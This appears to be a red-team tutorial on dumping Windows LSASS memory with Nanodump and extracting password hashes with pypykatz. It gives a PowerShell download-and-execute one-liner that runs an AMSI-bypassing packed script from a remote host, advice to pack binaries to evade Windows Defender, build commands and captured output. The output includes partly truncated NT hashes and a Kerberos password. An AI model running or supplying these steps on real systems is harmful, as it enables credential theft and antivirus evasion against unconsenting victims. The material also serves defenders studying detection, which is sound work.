==================================================================================================================================
OS Credential Dumping (LSASS) using 'Nanodump'
==================================================================================================================================

After a user logs on a Windows computer, the system generates and stores a variety of credential materials in LSASS process memory. 
Our objective is to extract the password hashes of the local and/or domain accounts stored in the memory of the Local Security 
Authority Subsystem Service (LSASS process) of a target Windows computer. 
A valid local or domain Windows account member of the 'local administrator' group is required for dumping the LSASS process.

> Usefull link: https://attack.mitre.org/techniques/T1003/001/


The tool nanodump.exe is the swiss army knife of LSASS dumping. It can create a dump file of the LSASS process memory with an invalid
signature so AV products like Windows Defender won't detect and delete it (like they do with procdump).

Usefull links:
> https://github.com/helpsystems/nanodump
> https://www.coresecurity.com/core-labs/articles/nanodump-red-team-approach-minidumps
> https://github.com/NotMedic/Invoke-Nanodump/blob/main/Invoke-Nanodump.ps1
> https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-NanoDump.ps1

It is an awesome tool that allow to dump the LSASS process using various techniques such as (not exhaustive list): 

- Process forking
  To avoid opening a handle to LSASS with PROCESS_VM_READ, you can use the --fork parameter.
  This will make nanodump create a handle to LSASS with PROCESS_CREATE_PROCESS access and then create a 'clone' of the process. 
  This new process will then be dumped. While this will result in a process creation and deletion, it removes the need to read 
  LSASS directly.

- Snapshot
  Similarly to the --fork option, you can use --snapshot to create a snapshot of the LSASS process.
  This will make nanodump create a handle to LSASS with PROCESS_CREATE_PROCESS access and then create a snapshot of the process
  using PssNtCaptureSnapshot. This new process will then be dumped. The snapshot will be freed automatically upon completion.

- Handle duplication
  As opening a handle to LSASS can be detected, nanodump can instead search for existing handles to LSASS.
  If one is found, it will copy it and use it to create the minidump.
  Note that it is not guaranteed to find such handle.

- Elevate handle
  You can obtaina handle to LSASS with PROCESS_QUERY_LIMITED_INFORMATION, which is likely to be whitelisted, and then elevate 
  that handle by duplicating it.

- Seclogon handle leak local
  To avoid opening a handle to LSASS, you can use abuse the seclogon service by calling CreateProcessWithLogonW to leak an LSASS
  handle into the nanodump binary.
  To enable this feature, use the --seclogon-leak-local parameter.
  Take into account that when used from Cobalt Strike, an unsigned nanodump binary needs to be written to disk to use this feature.

- Seclogon handle leak remote
  This technique is very similar to the previous one, but instead of leaking the handle into nanodump, it is leaked into another
  binary and then duplicated so that nanodump can used it. Use the --seclogon-leak-remote flag to access this functionality.

- Seclogon handle duplication
  You can trick the seclogon process to open a handle to LSASS and duplicate it before it is closed, by winning a race condition 
  using file locks. 
  Use the --seclogon-duplicate flag to access this functionality.

- ...

Note: A PowerShell version of script 'invoke-nanodump.ps1' can be found on the Internet or can be easily created using PowerShell 
reflective loading technique.


======================================================================================================================================
Example 1. Use 'invoke-nanodump.ps1' to dump the LSASS process memory of a Windows server and then use PypKatz to extract the hashes
======================================================================================================================================

Since the PowerShell script 'invoke-nanodump.ps1' is detected by AV products, we use in this exemple an obfuscated/encrypted version
of the script named 'Packed-nano.ps1' (with a function named 'invoke-nano') that uses an AMSI bypass technique to not be blocked by 
the Windows Defender AV running on the target Windows 10 laptop. To learn about AV bypass techniques please refer to the section 
'Defense evasion (examples)' of this Github project.

---------------------------------------------------------------------------------------------------------
Step 1 - Download & execute into memory the packed/encrypted version of the script 'Invoke-nanodump.ps1' 
---------------------------------------------------------------------------------------------------------

PS C:\Users\Administrator> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.113:8081/temp/Packed-nano.ps1');invoke-nano

Exit functions patched: True

Trying to dump LSASS to: C:\windows\temp\trash.evtx
lsass.exe found
The minidump has an invalid signature, restore it running:
bash restore_signature.sh trash.evtx
Done, to get the secretz run:
python3 -m pypykatz lsa minidump trash.evtx
Thread Complete

Dumpfile successfully created!


PS C:\Users\Administrator> ls C:\Windows\Temp\trash.evtx

    Directory: C:\Windows\Temp

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       03/02/2023     09:05       10792858 trash.evtx

-----------------------------------------------------------------------------------------------------------------------------------
Step 2 - Copy the lssas dump (trash.evtx) made with invoke-nanodump on a Kali VM and extract the credentials with the tool pypkatz 
-----------------------------------------------------------------------------------------------------------------------------------

jeff@kali:~$ cd /home/jeff/Documents/Tools/nanodump-main/
jeff@kali:~/Documents/Tools/nanodump-main$ cd scripts/
jeff@kali:~/Documents/Tools/nanodump-main/scripts$ ./restore_signature trash.evtx 
done, to analize the dump run:
python3 -m pypykatz lsa minidump trash.evtx


jeff@kali:~/Documents/Tools/nanodump-main/scripts$ ls -al
total 10992
drwxr-xr-x 2 jeff jeff     4096 Feb  3 00:35 .
drwxr-xr-x 7 jeff jeff     4096 Feb  3 00:35 ..
-rwxr-xr-x 1 jeff jeff     3901 Feb  2 15:19 randomize_sw2_seed.py
-rwxr-xr-x 1 jeff jeff   700432 Feb  2 15:19 restore_signature
-rw-r--r-- 1 jeff jeff 10538938 Feb  3 00:35 trash.evtx


jeff@kali:~/Documents/Tools/nanodump-main$ cd ../

jeff@kali:~/Documents/Tools$ mkdir pypkatz

jeff@kali:~/Documents/Tools$ cd pypkatz/

jeff@kali:~/Documents/Tools/pypkatz$ pip3 install pypykatz

Defaulting to user installation because normal site-packages is not writeable
Collecting pypykatz
  Using cached pypykatz-0.6.3-py3-none-any.whl (384 kB)
Collecting unicrypto>=0.0.9
<SNIP>


jeff@kali:~/Documents/Tools/pypkatz$ python3 -m pypykatz lsa minidump ../nanodump-main/scripts/trash.evtx 

INFO:pypykatz:Parsing file ../nanodump-main/scripts/trash.evtx
FILE: ======== ../nanodump-main/scripts/trash.evtx =======
== LogonSession ==
authentication_id 57553 (e0d1)
session_id 1
username DWM-1
domainname Window Manager
logon_server 
logon_time 2023-02-02T22:27:53.147347+00:00
sid S-1-5-90-0-1
luid 57553
        == MSV ==
                Username: WEBSERVER2$
                Domain: COMPANY
                LM: NA
                NT: b71e7e77879711011bc5c39b27<SNIP>
                SHA1: 3e142f00c4a695910fed0bac<SNIP>
                DPAPI: NA
        == WDIGEST [e0d1]==
                username WEBSERVER2$
                domainname COMPANY
                password None
                password (hex)
        == Kerberos ==
                Username: WEBSERVER2$
                Domain: company.work
                Password: E)`Yc43f/dw(VcZrm/Uc&+*ujA?lCgl,DfzQ7c?<SNIP>
                password (hex)450029006000590063003400330066002f0<SNIP>
        == WDIGEST [e0d1]==
                username WEBSERVER2$
                domainname COMPANY
                password None
                password (hex)

== LogonSession ==
authentication_id 996 (3e4)
session_id 0
username WEBSERVER2$
domainname COMPANY
logon_server 
logon_time 2023-02-02T22:27:52.659993+00:00
sid S-1-5-20
luid 996
        == MSV ==
                Username: WEBSERVER2$
                Domain: COMPANY
                LM: NA
                NT: b71e7e77879711011bc5c39b<SNIP>
                SHA1: 3e142f00c4a695910fed0b<SNIP>
                DPAPI: NA
        == WDIGEST [3e4]==
                username WEBSERVER2$
                domainname COMPANY
                password None
                password (hex)
        == Kerberos ==
                Username: webserver2$
                Domain: COMPANY.WORK
        == WDIGEST [3e4]==
                username WEBSERVER2$
                domainname COMPANY
                password None
                password (hex)

== LogonSession ==
authentication_id 31634 (7b92)
session_id 0
username 
domainname 
logon_server 
logon_time 2023-02-02T22:27:51.933031+00:00
sid None
luid 31634
        == MSV ==
                Username: WEBSERVER2$
                Domain: COMPANY
                LM: NA
                NT: b71e7e77879711011bc5c39b<SNIP>
                SHA1: 3e142f00c4a695910fed0b<SNIP>
                DPAPI: NA

== LogonSession ==
authentication_id 149493 (247f5)
session_id 1
username Administrator
domainname WEBSERVER2
logon_server WEBSERVER2
logon_time 2023-02-02T22:28:12.883487+00:00
sid S-1-5-21-2855040287-2641962212-1900751911-500
luid 149493
        == MSV ==
                Username: Administrator
                Domain: WEBSERVER2
                LM: NA
                NT: cf3a5525ee9414229e662796<SNIP>
                SHA1: 3c7374127c9a60f9e5b28d<SNIP>
                DPAPI: NA
        == WDIGEST [247f5]==
                username Administrator
                domainname WEBSERVER2
                password None
                password (hex)
        == Kerberos ==
                Username: Administrator
                Domain: WEBSERVER2
        == WDIGEST [247f5]==
                username Administrator
                domainname WEBSERVER2
                password None
                password (hex)
<SNIP>


======================================================================================================================================
Example 2. Use 'NANODUMP.x64.exe' to dump the LSASS process memory of a Windows 10 laptop and then use PypKatz to extract the hashes
======================================================================================================================================

--------------------------------------------------------------------------------------------------------------------------------------
Step 1 - Download and compile the tool Nanodump
--------------------------------------------------------------------------------------------------------------------------------------

=> https://github.com/fortra/nanodump

jeff@kali:~/Documents/Tools/nanodump-main$ ls -al
total 104
drwxr-xr-x  7 jeff jeff  4096 Feb  3 00:35 .
drwxr-xr-x 61 jeff jeff  4096 Mar 19 22:48 ..
drwxr-xr-x  2 jeff jeff  4096 Feb  2 15:19 dist
-rw-r--r--  1 jeff jeff    74 Feb  2 15:19 .gitignore
drwxr-xr-x  3 jeff jeff  4096 Feb  2 15:19 include
-rw-r--r--  1 jeff jeff 11357 Feb  2 15:19 LICENSE
-rw-r--r--  1 jeff jeff  7156 Feb  2 15:19 Makefile.mingw
-rw-r--r--  1 jeff jeff  5878 Feb  2 15:19 Makefile.msvc
-rw-r--r--  1 jeff jeff 22728 Feb  2 15:19 NanoDump.cna
-rw-r--r--  1 jeff jeff 18648 Feb  2 15:19 README.md
drwxr-xr-x  2 jeff jeff  4096 Feb  2 15:19 resources
drwxr-xr-x  2 jeff jeff  4096 Feb  3 00:35 scripts
drwxr-xr-x  3 jeff jeff  4096 Feb  2 15:19 source

jeff@kali:~/Documents/Tools/nanodump-main$ make -f Makefile.mingw
rm -f dist/*
###### RELEASE ######
x86_64-w64-mingw32-gcc source/spoof_callstack.c source/shtinkering.c source/dinvoke.c source/utils.c source/handle.c source/impersonate.c source/modules.c source/syscalls.c source/token_priv.c source/malseclogon.c source/nanodump.c source/werfault.c source/entry.c -o dist/nanodump.x64.exe -masm=intel -Wall -I include -DNANO -DEXE
x86_64-w64-mingw32-strip --strip-all dist/nanodump.x64.exe
i686-w64-mingw32-gcc source/spoof_callstack.c source/shtinkering.c source/dinvoke.c source/utils.c source/handle.c source/impersonate.c source/modules.c source/syscalls.c source/token_priv.c source/malseclogon.c source/nanodump.c source/werfault.c source/entry.c -o dist/nanodump.x86.exe -masm=intel -Wall -I include -DNANO -DEXE
i686-w64-mingw32-strip --strip-all dist/nanodump.x86.exe
x86_64-w64-mingw32-gcc -c source/entry.c -o dist/nanodump.x64.o -masm=intel -Wall -I include -DNANO -DBOF
x86_64-w64-mingw32-strip --strip-unneeded dist/nanodump.x64.o
x86_64-w64-mingw32-gcc source/utils.c source/handle.c source/modules.c source/syscalls.c source/token_priv.c source/nanodump.c source/entry.c -o dist/nanodump_ssp.x64.dll -masm=intel -Wall -I include -DNANO -DSSP -DDDL -shared
x86_64-w64-mingw32-strip --strip-all dist/nanodump_ssp.x64.dll
i686-w64-mingw32-gcc source/utils.c source/handle.c source/modules.c source/syscalls.c source/token_priv.c source/nanodump.c source/entry.c -o dist/nanodump_ssp.x86.dll -masm=intel -Wall -I include -DNANO -DSSP -DDDL -shared
i686-w64-mingw32-strip --strip-all dist/nanodump_ssp.x86.dll
x86_64-w64-mingw32-gcc -c source/load_ssp.c -o dist/load_ssp.x64.o -masm=intel -Wall -I include -DBOF
x86_64-w64-mingw32-strip --strip-unneeded dist/load_ssp.x64.o
x86_64-w64-mingw32-gcc source/utils.c source/syscalls.c source/dinvoke.c source/load_ssp.c -o dist/load_ssp.x64.exe -masm=intel -Wall -I include -DEXE
x86_64-w64-mingw32-strip --strip-all dist/load_ssp.x64.exe
i686-w64-mingw32-gcc source/utils.c source/syscalls.c source/dinvoke.c source/load_ssp.c -o dist/load_ssp.x86.exe -masm=intel -Wall -I include -DEXE
i686-w64-mingw32-strip --strip-all dist/load_ssp.x86.exe
x86_64-w64-mingw32-gcc -c source/delete_file.c -o dist/delete_file.x64.o -masm=intel -Wall -I include -DBOF
x86_64-w64-mingw32-strip --strip-unneeded dist/load_ssp.x64.o
gcc source/bin2c.c -o dist/bin2c -static -s -Os
x86_64-w64-mingw32-gcc source/spoof_callstack.c source/shtinkering.c source/output.c source/ppl/cleanup.c source/utils.c source/dinvoke.c source/handle.c source/impersonate.c source/modules.c source/syscalls.c source/token_priv.c source/malseclogon.c source/nanodump.c source/entry.c 
-o dist/nanodump_ppl.x64.dll -masm=intel -Wall -I include -DNANO -DPPL -DDDL -shared
x86_64-w64-mingw32-strip --strip-all dist/nanodump_ppl.x64.dll
./dist/bin2c dist/nanodump_ppl.x64.dll nanodump_ppl_dll > include/nanodump_ppl_dll.x64.h
i686-w64-mingw32-gcc source/spoof_callstack.c source/shtinkering.c source/output.c source/ppl/cleanup.c source/utils.c source/dinvoke.c source/handle.c source/impersonate.c source/modules.c source/syscalls.c source/token_priv.c source/malseclogon.c source/nanodump.c source/werfault.c source/entry.c
-o dist/nanodump_ppl.x86.dll -masm=intel -Wall -I include -DNANO -DPPL -DDDL -shared
i686-w64-mingw32-strip --strip-all dist/nanodump_ppl.x86.dll
./dist/bin2c dist/nanodump_ppl.x86.dll nanodump_ppl_dll > include/nanodump_ppl_dll.x86.h
x86_64-w64-mingw32-gcc source/utils.c source/syscalls.c source/dinvoke.c source/token_priv.c source/ppl/ppl_utils.c source/impersonate.c source/ppl/ppl.c -o dist/nanodump_ppl.x64.exe -masm=intel -Wall -I include -DEXE -DPPL
x86_64-w64-mingw32-strip --strip-all dist/nanodump_ppl.x64.exe
i686-w64-mingw32-gcc source/utils.c source/syscalls.c source/dinvoke.c source/token_priv.c source/ppl/ppl_utils.c source/impersonate.c source/ppl/ppl.c -o dist/nanodump_ppl.x86.exe -masm=intel -Wall -I include -DEXE -DPPL
i686-w64-mingw32-strip --strip-all dist/nanodump_ppl.x86.exe
x86_64-w64-mingw32-gcc -c source/ppl/ppl.c -o dist/nanodump_ppl.x64.o -masm=intel -Wall -I include -DBOF -DPPL
x86_64-w64-mingw32-strip --strip-unneeded dist/nanodump_ppl.x64.o
gcc source/restore_signature.c -o scripts/restore_signature -static -s -Os

jeff@kali:~/Documents/Tools/nanodump-main$ ls
dist  include  LICENSE  Makefile.mingw  Makefile.msvc  NanoDump.cna  README.md  resources  scripts  source

jeff@kali:~/Documents/Tools/nanodump-main$ cd dist/
jeff@kali:~/Documents/Tools/nanodump-main/dist$ ls
bin2c              load_ssp.x64.exe  load_ssp.x86.exe      nanodump_ppl.x64.exe  nanodump_ppl.x86.dll  nanodump_ssp.x64.dll  nanodump.x64.exe  nanodump.x86.exe
delete_file.x64.o  load_ssp.x64.o    nanodump_ppl.x64.dll  nanodump_ppl.x64.o    nanodump_ppl.x86.exe  nanodump_ssp.x86.dll  nanodump.x64.o

jeff@kali:~/Documents/Tools/nanodump-main/dist$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
192.168.13.20 - - [04/Apr/2023 16:22:10] "GET / HTTP/1.1" 200 -
192.168.13.20 - - [04/Apr/2023 16:22:10] code 404, message File not found
192.168.13.20 - - [04/Apr/2023 16:22:10] "GET /favicon.ico HTTP/1.1" 404 -
192.168.13.20 - - [04/Apr/2023 16:22:17] "GET /nanodump.x64.exe HTTP/1.1" 200 -
192.168.13.20 - - [04/Apr/2023 16:22:18] "GET /nanodump.x86.exe HTTP/1.1" 200 -
192.168.13.20 - - [04/Apr/2023 16:22:35] "GET /nanodump_ppl.x64.exe HTTP/1.1" 200 -
192.168.13.20 - - [04/Apr/2023 16:22:37] "GET /nanodump.x64.exe HTTP/1.1" 304 -
192.168.13.20 - - [04/Apr/2023 16:22:38] "GET /nanodump.x86.exe HTTP/1.1" 304 -
192.168.13.20 - - [04/Apr/2023 16:22:42] "GET /load_ssp.x64.exe HTTP/1.1" 200 -


--------------------------------------------------------------------------------------------------------------------------------------
Step 2 - Pack the tool Nanodump (x64) to be able to avoid AV detection
--------------------------------------------------------------------------------------------------------------------------------------

You need to pack the tool as it is flagged by most AV solutions such as Windows Defender.
Many packers can be used. To learn about AV bypass techniques please refer to the section 'Defense evasion (examples)' of this Github project.


----------------------------------------------------------------------------------------------------------------------------------------
Step 3 - Download and execute the packed version of the tool Nanodump (x64) on a target Windows 10 laptop protected by Windows Defender
----------------------------------------------------------------------------------------------------------------------------------------

C:\Temp> Packed-nano.exe
Only one of the following parameters must be provided:
 --write: nanodump will create the dump
 --silent-process-exit: WerFault will create the dump via SilentProcessExit
 --shtinkering: WerFault will create the dump via Shtinkering
 --getpid: get the PID of LSASS
Enter --help for more details


C:\Temp> Packed-nano.exe --help
usage: Packed-nano.exe [--write C:\Windows\Temp\doc.docx] [--valid] [--duplicate] [--elevate-handle] [--duplicate-elevate] [--seclogon-leak-local] 
                       [--seclogon-leak-remote C:\Windows\notepad.exe] [--seclogon-duplicate] [--spoof-callstack svchost] [--silent-process-exit C:\Windows\Temp]
                       [--shtinkering] [--fork] [--snapshot] [--getpid] [--help]
Dumpfile options:
    --write DUMP_PATH, -w DUMP_PATH
            filename of the dump
    --valid, -v
            create a dump with a valid signature
Obtain an LSASS handle via:
    --duplicate, -d
            duplicate a high privileged existing LSASS handle
    --duplicate-elevate, -de
            duplicate a low privileged existing LSASS handle and then elevate it
    --seclogon-leak-local, -sll
            leak an LSASS handle into nanodump via seclogon
    --seclogon-leak-remote BIN_PATH, -slt BIN_PATH
            leak an LSASS handle into another process via seclogon and duplicate it
    --seclogon-duplicate, -sd
            make seclogon open a handle to LSASS and duplicate it
    --spoof-callstack {svchost,wmi,rpc}, -sc {svchost,wmi,rpc}
            open a handle to LSASS using a fake calling stack
Let WerFault.exe (instead of nanodump) create the dump
    --silent-process-exit DUMP_FOLDER, -spe DUMP_FOLDER
            force WerFault.exe to dump LSASS via SilentProcessExit
    --shtinkering, -sk
            force WerFault.exe to dump LSASS via Shtinkering
Avoid reading LSASS directly:
    --fork, -f
            fork the target process before dumping
    --snapshot, -s
            snapshot the target process before dumping
Avoid opening a handle with high privileges:
    --elevate-handle, -eh
            open a handle to LSASS with low privileges and duplicate it to gain higher privileges
Miscellaneous:
    --getpid
            print the PID of LSASS and leave
Help:
    --help, -h
            print this help message and leave


C:\Temp> Packed-nano.exe --write test
The minidump has an invalid signature, restore it running:
scripts/restore_signature test
Done, to get the secretz run:
python3 -m pypykatz lsa minidump test
mimikatz.exe "sekurlsa::minidump test" "sekurlsa::logonPasswords full" exit

=> The memory dump file named 'test' has been created.

C:\Temp>dir test
 Volume in drive C is Windows
 Volume Serial Number is F06E-DC58

 Directory of C:\Temp

04/04/2023  05:06 PM        14,734,138 test
               1 File(s)     14,734,138 bytes
               0 Dir(s)  162,689,818,624 bytes free
C:\Temp>


-----------------------------------------------------------------------------------------------------------------------------------
Step 4 - Copy the memory dump file 'test' made with nanodump on a Kali VM and extract the credentials with the tool pypkatz 
-----------------------------------------------------------------------------------------------------------------------------------

jeff@kali:~/Documents/Tools/nanodump-main/scripts$ wget http://192.168.1.20:8080/test
--2023-04-04 17:10:12--  http://192.168.1.20:8080/test
Connecting to 192.168.1.20:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 14734138 (14M) [application/octet-stream]
Saving to: ‘test’

test  100%[===================================================================================================>]  14.05M  91.7MB/s    in 0.2s

2023-04-04 17:10:13 (91.7 MB/s) - ‘test’ saved [14734138/14734138]


jeff@kali:~/Documents/Tools/nanodump-main/scripts$ ./restore_signature test
done, to analize the dump run:
python3 -m pypykatz lsa minidump test

jeff@kali:~/Documents/Tools/nanodump-main/scripts$ python3 -m pypykatz lsa minidump test
INFO:pypykatz:Parsing file test
FILE: ======== test =======
== LogonSession ==
authentication_id 119029747 (7183ff3)
session_id 6
username auditor
domainname LAB
logon_server DC2
logon_time 2023-04-03T11:06:42.754178+00:00
sid S-1-5-21-666114207-2610<SNIP>
luid 119<SNIP>
        == MSV ==
                Username: auditor
                Domain: LAB
                LM: NA
                NT: 85a931e082c05f58bd12c<SNIP>
                SHA1: 3312401ebc36e003689<SNIP>
                DPAPI: bba5a02d57ddbc4638<SNIP>
        == WDIGEST [7183ff3]==
                username auditor
                domainname LAB
                password None
                password (hex)
        == Kerberos ==
                Username: auditor
                Domain: LAB
        == WDIGEST [7183ff3]==
                username auditor
                domainname LAB
                password None
                password (hex)
        == CREDMAN [7183ff3]==
                luid 119029747
                username cmd
                domain 192.168.1.52
                password None
                password (hex)
        == TSPKG [7183ff3]==
                username auditor
                domainname LAB
<SNIP>
